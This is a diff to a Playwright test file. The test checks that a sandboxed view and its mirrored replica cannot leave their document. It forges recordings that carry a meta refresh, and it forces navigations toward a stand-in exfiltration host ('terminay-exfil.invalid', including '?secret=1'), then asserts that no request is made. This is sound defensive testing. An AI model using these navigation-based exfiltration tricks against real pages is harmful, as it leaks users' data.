@@ -274,7 +274,14 @@ test('the recorder waits for acknowledgement, restarts from a snapshot on reques
 
 test('neither a view nor a mirror can leave the document it was given', async ({ page }) => {
 	const { view, replica } = await open(page);
-	hits.length = 0;
+	// An address the proxy's own header would let a frame load, so that only
+	// the rule that a frame stays its document stands in the way. Whether the
+	// browser asks for it is what shows the rule held.
+	const EXFIL = 'https://terminay-exfil.invalid';
+	const asked: string[] = [];
+	page.on('request', (request) => {
+		if (request.url().startsWith(EXFIL)) asked.push(request.url());
+	});
 
 	// A recording that carries a refreshing meta, as a hostile view could send.
 	const forged = JSON.stringify([
@@ -303,7 +310,7 @@ test('neither a view nor a mirror can leave the document it was given', async ({
 										{
 											type: 2,
 											tagName: 'meta',
-											attributes: { 'http-equiv': 'refresh', content: `0;url=${origin}/exfil-mirror` },
+											attributes: { 'http-equiv': 'refresh', content: `0;url=${EXFIL}/mirror` },
 											id: 4,
 											childNodes: [],
 										},
@@ -323,32 +330,42 @@ test('neither a view nor a mirror can leave the document it was given', async ({
 			},
 		},
 	]);
+	// A recording that claims to contain a document would have the replica
+	// reopen its own document and go dead. It is refused, and the replica
+	// lives to draw the next snapshot.
+	const lethal = JSON.stringify([
+		{ type: 4, data: { href: 'about:srcdoc', width: 440, height: 320 }, timestamp: 1 },
+		{ type: 2, timestamp: 2, data: { initialOffset: { left: 0, top: 0 }, node: { type: 0, id: 1, childNodes: [{ type: 2, tagName: 'html', attributes: {}, id: 2, childNodes: [{ type: 0, id: 3, childNodes: [] }] }] } } },
+	]);
+	await page.evaluate((data) => (window as unknown as SpikeWindow).mirrorSpike.forge(data), lethal);
+	await expect
+		.poll(() => page.evaluate(() => (window as unknown as SpikeWindow).mirrorSpike.state.reports.at(-1)?.type))
+		.toBe('failed');
 	await page.evaluate((data) => (window as unknown as SpikeWindow).mirrorSpike.forge(data), forged);
 	await expect(replica.locator('#forged')).toHaveText('forged');
 	// The meta is there as an inert element: it refreshes nothing.
 	await expect(replica.locator('meta[http-equiv]')).toHaveCount(0);
 	await page.waitForTimeout(1200);
 	await expect(replica.locator('#forged')).toHaveText('forged');
-	expect(hits.filter((path) => path.startsWith('/exfil'))).toEqual([]);
+	expect(asked).toEqual([]);
 
 	// A view that navigates itself would carry data out past its policy and
 	// leave a foreign page speaking as the view. Nothing is requested.
 	await view.locator('body').evaluate((_body, target) => {
-		location.href = `${target}/exfil-view?secret=1`;
-	}, origin).catch(() => undefined);
+		location.href = `${target}/view?secret=1`;
+	}, EXFIL).catch(() => undefined);
 	await page.waitForTimeout(1200);
-	expect(hits.filter((path) => path.startsWith('/exfil'))).toEqual([]);
+	expect(asked).toEqual([]);
 	// The same by a refreshing meta the view writes into itself.
 	const { view: second } = await open(page);
-	hits.length = 0;
 	await second.locator('body').evaluate((_body, target) => {
 		const meta = document.createElement('meta');
 		meta.httpEquiv = 'refresh';
-		meta.content = `0;url=${target}/exfil-meta`;
+		meta.content = `0;url=${target}/meta`;
 		document.head.append(meta);
-	}, origin).catch(() => undefined);
+	}, EXFIL).catch(() => undefined);
 	await page.waitForTimeout(1200);
-	expect(hits.filter((path) => path.startsWith('/exfil'))).toEqual([]);
+	expect(asked).toEqual([]);
 	// The workspace page itself went nowhere.
 	expect(page.url()).toBe(`${origin}/`);
 });
